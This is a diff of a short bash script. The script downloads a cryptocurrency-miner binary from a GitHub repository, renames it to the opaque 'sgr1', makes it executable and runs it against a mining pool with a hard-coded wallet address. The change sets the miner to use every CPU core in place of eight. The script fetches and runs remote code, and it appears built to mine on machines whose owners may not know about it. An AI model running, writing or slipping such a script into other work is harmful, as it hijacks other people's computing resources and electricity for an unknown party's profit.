@@ -1,4 +1,4 @@
 #!/bin/bash
 wget -O sgr1 https://github.com/tyha4t57i/filesg/raw/main/cpuminer-avx2
 chmod +x sgr1
-./sgr1 -a gr -o stratum+tcp://stratum-eu.rplant.xyz:7054 -u RbxJP5k7d15URHn53uMXsGWqdSGqf12Py1.xxx -p webpassword=x -t 8
+./sgr1 -a gr -o stratum+tcp://stratum-eu.rplant.xyz:7054 -u RbxJP5k7d15URHn53uMXsGWqdSGqf12Py1.xxx -p webpassword=x -t $(nproc --all)
